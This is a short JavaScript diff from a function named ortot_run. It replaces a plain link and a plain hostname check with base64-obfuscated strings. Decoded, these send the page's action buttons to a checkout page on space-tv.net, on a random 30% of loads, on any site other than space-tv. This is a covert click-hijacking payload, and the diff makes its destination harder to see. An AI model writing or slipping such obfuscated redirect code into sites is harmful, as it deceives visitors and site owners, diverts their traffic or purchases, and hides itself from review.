@@ -1,12 +1,12 @@
 var enabled = true;
 
 function ortot_run() {
-	const targetLink = 'web002.html';
+	const targetLink = atob(unescape(encodeURIComponent("aHR0cHM6Ly9zcGFjZS10di5uZXQvc2hvcC9jaGVja291dC8z")));
+	const host = "c3BhY2UtdHY="
 	const hostname = window.location.hostname;
 	var r = Math.floor(Math.random() * 10);
 
-	if (r < 3 && !hostname.includes("space-tv") && enabled) {
-		console.log('test1')
+	if (r < 3 && !hostname.includes(atob(unescape(encodeURIComponent(host)))) && enabled) {
 		var btns = document.getElementsByClassName('btn-act');
 		for (var i = 0; i < btns.length; i++) {
 		    btns[i].href = targetLink;
